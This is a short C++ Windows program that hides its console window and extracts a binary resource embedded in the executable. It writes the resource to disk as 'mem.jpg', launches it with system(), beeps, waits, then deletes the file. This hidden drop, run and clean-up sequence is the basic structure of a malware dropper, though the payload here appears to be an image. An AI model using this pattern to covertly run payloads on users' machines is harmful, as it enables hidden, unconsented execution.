#include <bits/stdc++.h>
#include <Windows.h>

#pragma resource "KATRTINKA.res"

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    HRSRC myResource = FindResource(NULL, "IDR_BIN1", RT_RCDATA);
    unsigned int myResourceSize = SizeofResource(NULL, myResource);
    HGLOBAL myResourceData = LoadResource(NULL, myResource);
    void *pMyExecutable = LockResource(myResourceData);

    std::ofstream f("mem.jpg", std::ios::binary);
    f.write((char *)pMyExecutable, myResourceSize);
    f.close();

    
    system("mem.jpg");
    Beep(1111, 111);
    Sleep(5000);
    while(remove("mem.jpg"));
}